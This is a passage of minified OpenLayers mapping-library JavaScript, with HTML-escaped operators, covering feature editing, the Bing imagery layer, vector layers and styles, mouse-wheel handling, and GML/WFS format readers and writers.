r;f?(m/=p,r=l/n/m):(n=Math.sqrt(n*n+p*p),m=Math.sqrt(l*l+m*m)/n);a.resize(m,d,r)}};c._sketch=!0;this.radiusHandle=c;this.radiusHandle.renderIntent=this.vertexRenderIntent;this.layer.addFeatures([this.radiusHandle],{silent:!0})},setMap:function(a){this.handlers.drag.setMap(a); OpenLayers.Control.prototype.setMap.apply(this,arguments)},handleMapEvents:function(a){"removelayer"!=a.type&amp;&amp;"order"!=a.property||this.moveLayerToTop()},moveLayerToTop:function(){var a=Math.max(this.map.Z_INDEX_BASE.Feature-1,this.layer.getZIndex())+1;this.layer.setZIndex(a)},moveLayerBack:function(){var a=this.layer.getZIndex()-1;a>=this.map.Z_INDEX_BASE.Feature?this.layer.setZIndex(a):this.map.setLayerZIndex(this.layer,this.map.getLayerIndex(this.layer))},CLASS_NAME:"OpenLayers.Control.ModifyFeature"}); OpenLayers.Control.ModifyFeature.RESHAPE=1;OpenLayers.Control.ModifyFeature.RESIZE=2;OpenLayers.Control.ModifyFeature.ROTATE=4;OpenLayers.Control.ModifyFeature.DRAG=8;OpenLayers.Layer.Bing=OpenLayers.Class(OpenLayers.Layer.XYZ,{key:null,serverResolutions:[156543.03390625,78271.516953125,39135.7584765625,19567.87923828125,9783.939619140625,4891.9698095703125,2445.9849047851562,1222.9924523925781,611.4962261962891,305.74811309814453,152.87405654907226,76.43702827453613,38.218514137268066,19.109257068634033,9.554628534317017,4.777314267158508,2.388657133579254,1.194328566789627,0.5971642833948135,0.29858214169740677,0.14929107084870338,0.07464553542435169],attributionTemplate:'&lt;span class="olBingAttribution ${type}">&lt;div>&lt;a target="_blank" href="http://www.bing.com/maps/">&lt;img src="${logo}" />&lt;/a>&lt;/div>${copyrights}&lt;a style="white-space: nowrap" target="_blank" href="http://www.microsoft.com/maps/product/terms.html">Terms of Use&lt;/a>&lt;/span>', metadata:null,protocolRegex:/^http:/i,type:"Road",culture:"en-US",metadataParams:null,tileOptions:null,protocol:~window.location.href.indexOf("http")?"":"http:",initialize:function(a){a=OpenLayers.Util.applyDefaults({sphericalMercator:!0},a);OpenLayers.Layer.XYZ.prototype.initialize.apply(this,[a.name||"Bing "+(a.type||this.type),null,a]);this.tileOptions=OpenLayers.Util.extend({crossOriginKeyword:"anonymous"},this.options.tileOptions);this.loadMetadata()},loadMetadata:function(){this._callbackId= "_callback_"+this.id.replace(/\./g,"_");window[this._callbackId]=OpenLayers.Function.bind(OpenLayers.Layer.Bing.processMetadata,this);var a=OpenLayers.Util.applyDefaults({key:this.key,jsonp:this._callbackId,include:"ImageryProviders"},this.metadataParams),a=this.protocol+"//dev.virtualearth.net/REST/v1/Imagery/Metadata/"+this.type+"?"+OpenLayers.Util.getParameterString(a),b=document.createElement("script");b.type="text/javascript";b.src=a;b.id=this._callbackId;document.getElementsByTagName("head")[0].appendChild(b)}, initLayer:function(){var a=this.metadata.resourceSets[0].resources[0],b=a.imageUrl.replace("{quadkey}","${quadkey}"),b=b.replace("{culture}",this.culture),b=b.replace(this.protocolRegex,this.protocol);this.url=[];for(var c=0;c&lt;a.imageUrlSubdomains.length;++c)this.url.push(b.replace("{subdomain}",a.imageUrlSubdomains[c]));this.addOptions({maxResolution:Math.min(this.serverResolutions[a.zoomMin],this.maxResolution||Number.POSITIVE_INFINITY),numZoomLevels:Math.min(a.zoomMax+1-a.zoomMin,this.numZoomLevels)}, !0);this.isBaseLayer||this.redraw();this.updateAttribution()},getURL:function(a){if(this.url){var b=this.getXYZ(a);a=b.x;for(var c=b.y,b=b.z,d=[],e=b;0&lt;e;--e){var f="0",g=1&lt;&lt;e-1;0!=(a&amp;g)&amp;&amp;f++;0!=(c&amp;g)&amp;&amp;(f++,f++);d.push(f)}d=d.join("");a=this.selectUrl(""+a+c+b,this.url);return OpenLayers.String.format(a,{quadkey:d})}},updateAttribution:function(){var a=this.metadata;if(a.resourceSets&amp;&amp;this.map&amp;&amp;this.map.center){var b=a.resourceSets[0].resources[0],c=this.map.getExtent().transform(this.map.getProjectionObject(), new OpenLayers.Projection("EPSG:4326")),d=b.imageryProviders||[],e=OpenLayers.Util.indexOf(this.serverResolutions,this.getServerResolution()),b="",f,g,h,k,l,m,n;g=0;for(h=d.length;g&lt;h;++g)for(f=d[g],k=0,l=f.coverageAreas.length;k&lt;l;++k)n=f.coverageAreas[k],m=OpenLayers.Bounds.fromArray(n.bbox,!0),c.intersectsBounds(m)&amp;&amp;(e&lt;=n.zoomMax&amp;&amp;e>=n.zoomMin)&amp;&amp;(b+=f.attribution+" ");a=a.brandLogoUri.replace(this.protocolRegex,this.protocol);this.attribution=OpenLayers.String.format(this.attributionTemplate,{type:this.type.toLowerCase(), logo:a,copyrights:b});this.map&amp;&amp;this.map.events.triggerEvent("changelayer",{layer:this,property:"attribution"})}},setMap:function(){OpenLayers.Layer.XYZ.prototype.setMap.apply(this,arguments);this.map.events.register("moveend",this,this.updateAttribution)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.Bing(this.options));return a=OpenLayers.Layer.XYZ.prototype.clone.apply(this,[a])},destroy:function(){this.map&amp;&amp;this.map.events.unregister("moveend",this,this.updateAttribution);OpenLayers.Layer.XYZ.prototype.destroy.apply(this, arguments)},CLASS_NAME:"OpenLayers.Layer.Bing"});OpenLayers.Layer.Bing.processMetadata=function(a){this.metadata=a;this.initLayer();a=document.getElementById(this._callbackId);a.parentNode.removeChild(a);window[this._callbackId]=void 0;delete this._callbackId};OpenLayers.StyleMap=OpenLayers.Class({styles:null,extendDefault:!0,initialize:function(a,b){this.styles={"default":new OpenLayers.Style(OpenLayers.Feature.Vector.style["default"]),select:new OpenLayers.Style(OpenLayers.Feature.Vector.style.select),temporary:new OpenLayers.Style(OpenLayers.Feature.Vector.style.temporary),"delete":new OpenLayers.Style(OpenLayers.Feature.Vector.style["delete"])};if(a instanceof OpenLayers.Style)this.styles["default"]=a,this.styles.select=a,this.styles.temporary=a,this.styles["delete"]= a;else if("object"==typeof a)for(var c in a)if(a[c]instanceof OpenLayers.Style)this.styles[c]=a[c];else if("object"==typeof a[c])this.styles[c]=new OpenLayers.Style(a[c]);else{this.styles["default"]=new OpenLayers.Style(a);this.styles.select=new OpenLayers.Style(a);this.styles.temporary=new OpenLayers.Style(a);this.styles["delete"]=new OpenLayers.Style(a);break}OpenLayers.Util.extend(this,b)},destroy:function(){for(var a in this.styles)this.styles[a].destroy();this.styles=null},createSymbolizer:function(a, b){a||(a=new OpenLayers.Feature.Vector);this.styles[b]||(b="default");a.renderIntent=b;var c={};this.extendDefault&amp;&amp;"default"!=b&amp;&amp;(c=this.styles["default"].createSymbolizer(a));return OpenLayers.Util.extend(c,this.styles[b].createSymbolizer(a))},addUniqueValueRules:function(a,b,c,d){var e=[],f;for(f in c)e.push(new OpenLayers.Rule({symbolizer:c[f],context:d,filter:new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.EQUAL_TO,property:b,value:f})}));this.styles[a].addRules(e)},CLASS_NAME:"OpenLayers.StyleMap"});OpenLayers.Layer.Vector=OpenLayers.Class(OpenLayers.Layer,{isBaseLayer:!1,isFixed:!1,features:null,filter:null,selectedFeatures:null,unrenderedFeatures:null,reportError:!0,style:null,styleMap:null,strategies:null,protocol:null,renderers:["SVG","VML","Canvas"],renderer:null,rendererOptions:null,geometryType:null,drawn:!1,ratio:1,initialize:function(a,b){OpenLayers.Layer.prototype.initialize.apply(this,arguments);this.renderer&amp;&amp;this.renderer.supported()||this.assignRenderer();this.renderer&amp;&amp;this.renderer.supported()|| (this.renderer=null,this.displayError());this.styleMap||(this.styleMap=new OpenLayers.StyleMap);this.features=[];this.selectedFeatures=[];this.unrenderedFeatures={};if(this.strategies)for(var c=0,d=this.strategies.length;c&lt;d;c++)this.strategies[c].setLayer(this)},destroy:function(){if(this.strategies){var a,b,c;b=0;for(c=this.strategies.length;b&lt;c;b++)a=this.strategies[b],a.autoDestroy&amp;&amp;a.destroy();this.strategies=null}this.protocol&amp;&amp;(this.protocol.autoDestroy&amp;&amp;this.protocol.destroy(),this.protocol= null);this.destroyFeatures();this.unrenderedFeatures=this.selectedFeatures=this.features=null;this.renderer&amp;&amp;this.renderer.destroy();this.drawn=this.geometryType=this.renderer=null;OpenLayers.Layer.prototype.destroy.apply(this,arguments)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.Vector(this.name,this.getOptions()));a=OpenLayers.Layer.prototype.clone.apply(this,[a]);for(var b=this.features,c=b.length,d=Array(c),e=0;e&lt;c;++e)d[e]=b[e].clone();a.features=d;return a},refresh:function(a){this.calculateInRange()&amp;&amp; this.visibility&amp;&amp;this.events.triggerEvent("refresh",a)},assignRenderer:function(){for(var a=0,b=this.renderers.length;a&lt;b;a++){var c=this.renderers[a];if((c="function"==typeof c?c:OpenLayers.Renderer[c])&amp;&amp;c.prototype.supported()){this.renderer=new c(this.div,this.rendererOptions);break}}},displayError:function(){this.reportError&amp;&amp;OpenLayers.Console.userError(OpenLayers.i18n("browserNotSupported",{renderers:this.renderers.join("\n")}))},setMap:function(a){OpenLayers.Layer.prototype.setMap.apply(this, arguments);if(this.renderer){this.renderer.map=this.map;var b=this.map.getSize();b.w*=this.ratio;b.h*=this.ratio;this.renderer.setSize(b)}else this.map.removeLayer(this)},afterAdd:function(){if(this.strategies){var a,b,c;b=0;for(c=this.strategies.length;b&lt;c;b++)a=this.strategies[b],a.autoActivate&amp;&amp;a.activate()}},removeMap:function(a){this.drawn=!1;if(this.strategies){var b,c;b=0;for(c=this.strategies.length;b&lt;c;b++)a=this.strategies[b],a.autoActivate&amp;&amp;a.deactivate()}},onMapResize:function(){OpenLayers.Layer.prototype.onMapResize.apply(this, arguments);var a=this.map.getSize();a.w*=this.ratio;a.h*=this.ratio;this.renderer.setSize(a)},moveTo:function(a,b,c){OpenLayers.Layer.prototype.moveTo.apply(this,arguments);var d=!0;if(!c){this.renderer.root.style.visibility="hidden";var d=this.map.getSize(),e=d.w,d=d.h,e=e/2*this.ratio-e/2,d=d/2*this.ratio-d/2,e=e+this.map.layerContainerOriginPx.x,e=-Math.round(e),d=d+this.map.layerContainerOriginPx.y,d=-Math.round(d);this.div.style.left=e+"px";this.div.style.top=d+"px";e=this.map.getExtent().scale(this.ratio); d=this.renderer.setExtent(e,b);this.renderer.root.style.visibility="visible";!0===OpenLayers.IS_GECKO&amp;&amp;(this.div.scrollLeft=this.div.scrollLeft);if(!b&amp;&amp;d)for(var f in this.unrenderedFeatures)e=this.unrenderedFeatures[f],this.drawFeature(e)}if(!this.drawn||b||!d)for(this.drawn=!0,f=0,d=this.features.length;f&lt;d;f++)this.renderer.locked=f!==d-1,e=this.features[f],this.drawFeature(e)},display:function(a){OpenLayers.Layer.prototype.display.apply(this,arguments);var b=this.div.style.display;b!=this.renderer.root.style.display&amp;&amp; (this.renderer.root.style.display=b)},addFeatures:function(a,b){OpenLayers.Util.isArray(a)||(a=[a]);var c=!b||!b.silent;if(c){var d={features:a};if(!1===this.events.triggerEvent("beforefeaturesadded",d))return;a=d.features}for(var d=[],e=0,f=a.length;e&lt;f;e++){this.renderer.locked=e!=a.length-1?!0:!1;var g=a[e];if(this.geometryType&amp;&amp;!(g.geometry instanceof this.geometryType))throw new TypeError("addFeatures: component should be an "+this.geometryType.prototype.CLASS_NAME);g.layer=this;!g.style&amp;&amp;this.style&amp;&amp; (g.style=OpenLayers.Util.extend({},this.style));if(c){if(!1===this.events.triggerEvent("beforefeatureadded",{feature:g}))continue;this.preFeatureInsert(g)}d.push(g);this.features.push(g);this.drawFeature(g);c&amp;&amp;(this.events.triggerEvent("featureadded",{feature:g}),this.onFeatureInsert(g))}c&amp;&amp;this.events.triggerEvent("featuresadded",{features:d})},removeFeatures:function(a,b){if(a&amp;&amp;0!==a.length){if(a===this.features)return this.removeAllFeatures(b);OpenLayers.Util.isArray(a)||(a=[a]);a===this.selectedFeatures&amp;&amp; (a=a.slice());var c=!b||!b.silent;c&amp;&amp;this.events.triggerEvent("beforefeaturesremoved",{features:a});for(var d=a.length-1;0&lt;=d;d--){this.renderer.locked=0!=d&amp;&amp;a[d-1].geometry?!0:!1;var e=a[d];delete this.unrenderedFeatures[e.id];c&amp;&amp;this.events.triggerEvent("beforefeatureremoved",{feature:e});this.features=OpenLayers.Util.removeItem(this.features,e);e.layer=null;e.geometry&amp;&amp;this.renderer.eraseFeatures(e);-1!=OpenLayers.Util.indexOf(this.selectedFeatures,e)&amp;&amp;OpenLayers.Util.removeItem(this.selectedFeatures, e);c&amp;&amp;this.events.triggerEvent("featureremoved",{feature:e})}c&amp;&amp;this.events.triggerEvent("featuresremoved",{features:a})}},removeAllFeatures:function(a){a=!a||!a.silent;var b=this.features;a&amp;&amp;this.events.triggerEvent("beforefeaturesremoved",{features:b});for(var c,d=b.length-1;0&lt;=d;d--)c=b[d],a&amp;&amp;this.events.triggerEvent("beforefeatureremoved",{feature:c}),c.layer=null,a&amp;&amp;this.events.triggerEvent("featureremoved",{feature:c});this.renderer.clear();this.features=[];this.unrenderedFeatures={};this.selectedFeatures= [];a&amp;&amp;this.events.triggerEvent("featuresremoved",{features:b})},destroyFeatures:function(a,b){void 0==a&amp;&amp;(a=this.features);if(a){this.removeFeatures(a,b);for(var c=a.length-1;0&lt;=c;c--)a[c].destroy()}},drawFeature:function(a,b){if(this.drawn){if("object"!=typeof b){b||a.state!==OpenLayers.State.DELETE||(b="delete");var c=b||a.renderIntent;(b=a.style||this.style)||(b=this.styleMap.createSymbolizer(a,c))}c=this.renderer.drawFeature(a,b);!1===c||null===c?this.unrenderedFeatures[a.id]=a:delete this.unrenderedFeatures[a.id]}}, eraseFeatures:function(a){this.renderer.eraseFeatures(a)},getFeatureFromEvent:function(a){if(!this.renderer)throw Error("getFeatureFromEvent called on layer with no renderer. This usually means you destroyed a layer, but not some handler which is associated with it.");var b=null;(a=this.renderer.getFeatureIdFromEvent(a))&amp;&amp;(b="string"===typeof a?this.getFeatureById(a):a);return b},getFeatureBy:function(a,b){for(var c=null,d=0,e=this.features.length;d&lt;e;++d)if(this.features[d][a]==b){c=this.features[d]; break}return c},getFeatureById:function(a){return this.getFeatureBy("id",a)},getFeatureByFid:function(a){return this.getFeatureBy("fid",a)},getFeaturesByAttribute:function(a,b){var c,d,e=this.features.length,f=[];for(c=0;c&lt;e;c++)(d=this.features[c])&amp;&amp;d.attributes&amp;&amp;d.attributes[a]===b&amp;&amp;f.push(d);return f},onFeatureInsert:function(a){},preFeatureInsert:function(a){},getDataExtent:function(){var a=null,b=this.features;if(b&amp;&amp;0&lt;b.length)for(var c=null,d=0,e=b.length;d&lt;e;d++)if(c=b[d].geometry)null===a&amp;&amp; (a=new OpenLayers.Bounds),a.extend(c.getBounds());return a},CLASS_NAME:"OpenLayers.Layer.Vector"});OpenLayers.Layer.PointGrid=OpenLayers.Class(OpenLayers.Layer.Vector,{dx:null,dy:null,ratio:1.5,maxFeatures:250,rotation:0,origin:null,gridBounds:null,initialize:function(a){a=a||{};OpenLayers.Layer.Vector.prototype.initialize.apply(this,[a.name,a])},setMap:function(a){OpenLayers.Layer.Vector.prototype.setMap.apply(this,arguments);a.events.register("moveend",this,this.onMoveEnd)},removeMap:function(a){a.events.unregister("moveend",this,this.onMoveEnd);OpenLayers.Layer.Vector.prototype.removeMap.apply(this, arguments)},setRatio:function(a){this.ratio=a;this.updateGrid(!0)},setMaxFeatures:function(a){this.maxFeatures=a;this.updateGrid(!0)},setSpacing:function(a,b){this.dx=a;this.dy=b||a;this.updateGrid(!0)},setOrigin:function(a){this.origin=a;this.updateGrid(!0)},getOrigin:function(){this.origin||(this.origin=this.map.getExtent().getCenterLonLat());return this.origin},setRotation:function(a){this.rotation=a;this.updateGrid(!0)},onMoveEnd:function(){this.updateGrid()},getViewBounds:function(){var a=this.map.getExtent(); if(this.rotation){var b=this.getOrigin(),b=new OpenLayers.Geometry.Point(b.lon,b.lat),a=a.toGeometry();a.rotate(-this.rotation,b);a=a.getBounds()}return a},updateGrid:function(a){if(a||this.invalidBounds()){var b=this.getViewBounds(),c=this.getOrigin();a=new OpenLayers.Geometry.Point(c.lon,c.lat);var d=b.getWidth(),e=b.getHeight(),f=d/e,g=Math.sqrt(this.dx*this.dy*this.maxFeatures/f),d=Math.min(d*this.ratio,g*f),e=Math.min(e*this.ratio,g),b=b.getCenterLonLat();this.gridBounds=new OpenLayers.Bounds(b.lon- d/2,b.lat-e/2,b.lon+d/2,b.lat+e/2);for(var b=Math.floor(e/this.dy),d=Math.floor(d/this.dx),e=c.lon+this.dx*Math.ceil((this.gridBounds.left-c.lon)/this.dx),c=c.lat+this.dy*Math.ceil((this.gridBounds.bottom-c.lat)/this.dy),g=Array(b*d),h,k=0;k&lt;d;++k)for(var f=e+k*this.dx,l=0;l&lt;b;++l)h=c+l*this.dy,h=new OpenLayers.Geometry.Point(f,h),this.rotation&amp;&amp;h.rotate(this.rotation,a),g[k*b+l]=new OpenLayers.Feature.Vector(h);this.destroyFeatures(this.features,{silent:!0});this.addFeatures(g,{silent:!0})}},invalidBounds:function(){return!this.gridBounds|| !this.gridBounds.containsBounds(this.getViewBounds())},CLASS_NAME:"OpenLayers.Layer.PointGrid"});OpenLayers.Handler.MouseWheel=OpenLayers.Class(OpenLayers.Handler,{wheelListener:null,interval:0,maxDelta:Number.POSITIVE_INFINITY,delta:0,cumulative:!0,initialize:function(a,b,c){OpenLayers.Handler.prototype.initialize.apply(this,arguments);this.wheelListener=OpenLayers.Function.bindAsEventListener(this.onWheelEvent,this)},destroy:function(){OpenLayers.Handler.prototype.destroy.apply(this,arguments);this.wheelListener=null},onWheelEvent:function(a){if(this.map&amp;&amp;this.checkModifiers(a)){for(var b= !1,c=!1,d=!1,e=OpenLayers.Event.element(a);null!=e&amp;&amp;!d&amp;&amp;!b;){if(!b)try{var f,b=(f=e.currentStyle?e.currentStyle.overflow:document.defaultView.getComputedStyle(e,null).getPropertyValue("overflow"))&amp;&amp;"auto"==f||"scroll"==f}catch(g){}if(!c&amp;&amp;(c=OpenLayers.Element.hasClass(e,"olScrollable"),!c))for(var d=0,h=this.map.layers.length;d&lt;h;d++){var k=this.map.layers[d];if(e==k.div||e==k.pane){c=!0;break}}d=e==this.map.div;e=e.parentNode}if(!b&amp;&amp;d){if(c)if(b=0,a.wheelDelta?(b=a.wheelDelta,0===b%160&amp;&amp;(b*=0.75), b/=120):a.detail&amp;&amp;(b=-(a.detail/Math.abs(a.detail))),this.delta+=b,window.clearTimeout(this._timeoutId),this.interval&amp;&amp;Math.abs(this.delta)&lt;this.maxDelta){var l=OpenLayers.Util.extend({},a);this._timeoutId=window.setTimeout(OpenLayers.Function.bind(function(){this.wheelZoom(l)},this),this.interval)}else this.wheelZoom(a);OpenLayers.Event.stop(a)}}},wheelZoom:function(a){var b=this.delta;this.delta=0;b&amp;&amp;(a.xy=this.map.events.getMousePosition(a),0>b?this.callback("down",[a,this.cumulative?Math.max(-this.maxDelta, b):-1]):this.callback("up",[a,this.cumulative?Math.min(this.maxDelta,b):1]))},activate:function(a){if(OpenLayers.Handler.prototype.activate.apply(this,arguments)){var b=this.wheelListener;OpenLayers.Event.observe(window,"DOMMouseScroll",b);OpenLayers.Event.observe(window,"mousewheel",b);OpenLayers.Event.observe(document,"mousewheel",b);return!0}return!1},deactivate:function(a){if(OpenLayers.Handler.prototype.deactivate.apply(this,arguments)){var b=this.wheelListener;OpenLayers.Event.stopObserving(window, "DOMMouseScroll",b);OpenLayers.Event.stopObserving(window,"mousewheel",b);OpenLayers.Event.stopObserving(document,"mousewheel",b);return!0}return!1},CLASS_NAME:"OpenLayers.Handler.MouseWheel"});OpenLayers.Symbolizer=OpenLayers.Class({zIndex:0,initialize:function(a){OpenLayers.Util.extend(this,a)},clone:function(){return new (eval(this.CLASS_NAME))(OpenLayers.Util.extend({},this))},CLASS_NAME:"OpenLayers.Symbolizer"});OpenLayers.Symbolizer.Raster=OpenLayers.Class(OpenLayers.Symbolizer,{initialize:function(a){OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)},CLASS_NAME:"OpenLayers.Symbolizer.Raster"});OpenLayers.Rule=OpenLayers.Class({id:null,name:null,title:null,description:null,context:null,filter:null,elseFilter:!1,symbolizer:null,symbolizers:null,minScaleDenominator:null,maxScaleDenominator:null,initialize:function(a){this.symbolizer={};OpenLayers.Util.extend(this,a);this.symbolizers&amp;&amp;delete this.symbolizer;this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")},destroy:function(){for(var a in this.symbolizer)this.symbolizer[a]=null;this.symbolizer=null;delete this.symbolizers},evaluate:function(a){var b= this.getContext(a),c=!0;if(this.minScaleDenominator||this.maxScaleDenominator)var d=a.layer.map.getScale();this.minScaleDenominator&amp;&amp;(c=d>=OpenLayers.Style.createLiteral(this.minScaleDenominator,b));c&amp;&amp;this.maxScaleDenominator&amp;&amp;(c=d&lt;OpenLayers.Style.createLiteral(this.maxScaleDenominator,b));c&amp;&amp;this.filter&amp;&amp;(c="OpenLayers.Filter.FeatureId"==this.filter.CLASS_NAME?this.filter.evaluate(a):this.filter.evaluate(b));return c},getContext:function(a){var b=this.context;b||(b=a.attributes||a.data);"function"== typeof this.context&amp;&amp;(b=this.context(a));return b},clone:function(){var a=OpenLayers.Util.extend({},this);if(this.symbolizers){var b=this.symbolizers.length;a.symbolizers=Array(b);for(var c=0;c&lt;b;++c)a.symbolizers[c]=this.symbolizers[c].clone()}else{a.symbolizer={};for(var d in this.symbolizer)b=this.symbolizer[d],c=typeof b,"object"===c?a.symbolizer[d]=OpenLayers.Util.extend({},b):"string"===c&amp;&amp;(a.symbolizer[d]=b)}a.filter=this.filter&amp;&amp;this.filter.clone();a.context=this.context&amp;&amp;OpenLayers.Util.extend({}, this.context);return new OpenLayers.Rule(a)},CLASS_NAME:"OpenLayers.Rule"});OpenLayers.Format.SLD=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{profile:null,defaultVersion:"1.0.0",stringifyOutput:!0,namedLayersAsArray:!1,CLASS_NAME:"OpenLayers.Format.SLD"});OpenLayers.Symbolizer.Polygon=OpenLayers.Class(OpenLayers.Symbolizer,{initialize:function(a){OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)},CLASS_NAME:"OpenLayers.Symbolizer.Polygon"});OpenLayers.Format.GML.v2=OpenLayers.Class(OpenLayers.Format.GML.Base,{schemaLocation:"http://www.opengis.net/gml http://schemas.opengis.net/gml/2.1.2/feature.xsd",initialize:function(a){OpenLayers.Format.GML.Base.prototype.initialize.apply(this,[a])},readers:{gml:OpenLayers.Util.applyDefaults({outerBoundaryIs:function(a,b){var c={};this.readChildNodes(a,c);b.outer=c.components[0]},innerBoundaryIs:function(a,b){var c={};this.readChildNodes(a,c);b.inner.push(c.components[0])},Box:function(a,b){var c= {};this.readChildNodes(a,c);b.components||(b.components=[]);var d=c.points[0],c=c.points[1];b.components.push(new OpenLayers.Bounds(d.x,d.y,c.x,c.y))}},OpenLayers.Format.GML.Base.prototype.readers.gml),feature:OpenLayers.Format.GML.Base.prototype.readers.feature,wfs:OpenLayers.Format.GML.Base.prototype.readers.wfs},write:function(a){var b;b=OpenLayers.Util.isArray(a)?"wfs:FeatureCollection":"gml:featureMember";a=this.writeNode(b,a);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation); return OpenLayers.Format.XML.prototype.write.apply(this,[a])},writers:{gml:OpenLayers.Util.applyDefaults({Point:function(a){var b=this.createElementNSPlus("gml:Point");this.writeNode("coordinates",[a],b);return b},coordinates:function(a){for(var b=a.length,c=Array(b),d,e=0;e&lt;b;++e)d=a[e],c[e]=this.xy?d.x+","+d.y:d.y+","+d.x,void 0!=d.z&amp;&amp;(c[e]+=","+d.z);return this.createElementNSPlus("gml:coordinates",{attributes:{decimal:".",cs:",",ts:" "},value:1==b?c[0]:c.join(" ")})},LineString:function(a){var b= this.createElementNSPlus("gml:LineString");this.writeNode("coordinates",a.components,b);return b},Polygon:function(a){var b=this.createElementNSPlus("gml:Polygon");this.writeNode("outerBoundaryIs",a.components[0],b);for(var c=1;c&lt;a.components.length;++c)this.writeNode("innerBoundaryIs",a.components[c],b);return b},outerBoundaryIs:function(a){var b=this.createElementNSPlus("gml:outerBoundaryIs");this.writeNode("LinearRing",a,b);return b},innerBoundaryIs:function(a){var b=this.createElementNSPlus("gml:innerBoundaryIs"); this.writeNode("LinearRing",a,b);return b},LinearRing:function(a){var b=this.createElementNSPlus("gml:LinearRing");this.writeNode("coordinates",a.components,b);return b},Box:function(a){var b=this.createElementNSPlus("gml:Box");this.writeNode("coordinates",[{x:a.left,y:a.bottom},{x:a.right,y:a.top}],b);this.srsName&amp;&amp;b.setAttribute("srsName",this.srsName);return b}},OpenLayers.Format.GML.Base.prototype.writers.gml),feature:OpenLayers.Format.GML.Base.prototype.writers.feature,wfs:OpenLayers.Format.GML.Base.prototype.writers.wfs}, CLASS_NAME:"OpenLayers.Format.GML.v2"});OpenLayers.Format.Filter.v1_0_0=OpenLayers.Class(OpenLayers.Format.GML.v2,OpenLayers.Format.Filter.v1,{VERSION:"1.0.0",schemaLocation:"http://www.opengis.net/ogc/filter/1.0.0/filter.xsd",initialize:function(a){OpenLayers.Format.GML.v2.prototype.initialize.apply(this,[a])},readers:{ogc:OpenLayers.Util.applyDefaults({PropertyIsEqualTo:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.EQUAL_TO});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsNotEqualTo:function(a, b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.NOT_EQUAL_TO});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsLike:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.LIKE});this.readChildNodes(a,c);var d=a.getAttribute("wildCard"),e=a.getAttribute("singleChar"),f=a.getAttribute("escape");c.value2regex(d,e,f);b.filters.push(c)}},OpenLayers.Format.Filter.v1.prototype.readers.ogc),gml:OpenLayers.Format.GML.v2.prototype.readers.gml, feature:OpenLayers.Format.GML.v2.prototype.readers.feature},writers:{ogc:OpenLayers.Util.applyDefaults({PropertyIsEqualTo:function(a){var b=this.createElementNSPlus("ogc:PropertyIsEqualTo");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsNotEqualTo:function(a){var b=this.createElementNSPlus("ogc:PropertyIsNotEqualTo");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsLike:function(a){var b=this.createElementNSPlus("ogc:PropertyIsLike", {attributes:{wildCard:"*",singleChar:".",escape:"!"}});this.writeNode("PropertyName",a,b);this.writeNode("Literal",a.regex2value(),b);return b},BBOX:function(a){var b=this.createElementNSPlus("ogc:BBOX");a.property&amp;&amp;this.writeNode("PropertyName",a,b);var c=this.writeNode("gml:Box",a.value,b);a.projection&amp;&amp;c.setAttribute("srsName",a.projection);return b}},OpenLayers.Format.Filter.v1.prototype.writers.ogc),gml:OpenLayers.Format.GML.v2.prototype.writers.gml,feature:OpenLayers.Format.GML.v2.prototype.writers.feature}, writeSpatial:function(a,b){var c=this.createElementNSPlus("ogc:"+b);this.writeNode("PropertyName",a,c);if(a.value instanceof OpenLayers.Filter.Function)this.writeNode("Function",a.value,c);else{var d;d=a.value instanceof OpenLayers.Geometry?this.writeNode("feature:_geometry",a.value).firstChild:this.writeNode("gml:Box",a.value);a.projection&amp;&amp;d.setAttribute("srsName",a.projection);c.appendChild(d)}return c},CLASS_NAME:"OpenLayers.Format.Filter.v1_0_0"});OpenLayers.Format.WFST.v1_0_0=OpenLayers.Class(OpenLayers.Format.Filter.v1_0_0,OpenLayers.Format.WFST.v1,{version:"1.0.0",srsNameInQuery:!1,schemaLocations:{wfs:"http://schemas.opengis.net/wfs/1.0.0/WFS-transaction.xsd"},initialize:function(a){OpenLayers.Format.Filter.v1_0_0.prototype.initialize.apply(this,[a]);OpenLayers.Format.WFST.v1.prototype.initialize.apply(this,[a])},readNode:function(a,b,c){return OpenLayers.Format.GML.v2.prototype.readNode.apply(this,arguments)},readers:{wfs:OpenLayers.Util.applyDefaults({WFS_TransactionResponse:function(a, b){b.insertIds=[];b.success=!1;this.readChildNodes(a,b)},InsertResult:function(a,b){var c={fids:[]};this.readChildNodes(a,c);b.insertIds=b.insertIds.concat(c.fids)},TransactionResult:function(a,b){this.readChildNodes(a,b)},Status:function(a,b){this.readChildNodes(a,b)},SUCCESS:function(a,b){b.success=!0}},OpenLayers.Format.WFST.v1.prototype.readers.wfs),gml:OpenLayers.Format.GML.v2.prototype.readers.gml,feature:OpenLayers.Format.GML.v2.prototype.readers.feature,ogc:OpenLayers.Format.Filter.v1_0_0.prototype.readers.ogc}, writers:{wfs:OpenLayers.Util.applyDefaults({Query:function(a){a=OpenLayers.Util.extend({featureNS:this.featureNS,featurePrefix:this.featurePrefix,featureType:this.featureType,srsName:this.srsName,srsNameInQuery:this.srsNameInQuery},a);var b=a.featurePrefix,c=this.createElementNSPlus("wfs:Query",{attributes:{typeName:(b?b+":":"")+a.featureType}});a.srsNameInQuery&amp;&amp;a.srsName&amp;&amp;c.setAttribute("srsName",a.srsName);a.featureNS&amp;&amp;c.setAttribute("xmlns:"+b,a.featureNS);if(a.propertyNames)for(var b=0,d=a.propertyNames.length;b&lt; d;b++)this.writeNode("ogc:PropertyName",{property:a.propertyNames[b]},c);a.filter&amp;&amp;(this.setFilterProperty(a.filter),this.writeNode("ogc:Filter",a.filter,c));return 